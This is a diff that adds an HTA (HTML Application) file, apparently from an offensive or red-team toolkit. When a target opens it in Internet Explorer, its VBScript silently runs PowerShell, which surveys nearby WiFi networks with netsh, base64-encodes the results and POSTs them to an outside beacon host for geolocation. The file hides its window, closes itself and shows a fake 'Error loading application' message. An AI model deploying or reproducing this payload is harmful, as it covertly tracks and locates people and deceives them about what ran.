@@ -1,0 +1,29 @@
+<html>
+<head>
+    <title>HTA Execute</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=9" />
+    <HTA:APPLICATION 
+        ID="objTest" 
+        APPLICATIONNAME="HTA Test"
+        WINDOWSTATE="minimize"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+    />
+</head>
+<script language="VBScript">
+' Serve this HTA file to an Internet Explorer browser running in Windows.
+' Loading the document will prompt the target for permission to execute the HTA.
+' Consent for HTA execution will result in geolocation by a survey of nearby WiFi access points.
+
+Dim objWSH
+Set objWSH = CreateObject("WScript.Shell")
+Dim cmd
+cmd = "powershell.exe -command ""($PostDat = @{os=\""windows\"";data=$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(($(netsh wlan show networks mode=bssid) | findstr \""SSID Signal Channel\"" | Out-String))))} | Invoke-WebRequest -Uri \""https://beacon.lanmaster53.com/bacon/yum/4746890f-14a6-47eb-a948-40043425fb57/HTA-Executable\"" -Method POST -ErrorAction SilentlyContinue)"""
+Call objWSH.Run(cmd, 0, True)
+
+Window.Close
+</script>
+<body>
+    <p>Error loading application.</p>
+</body>
+</html>
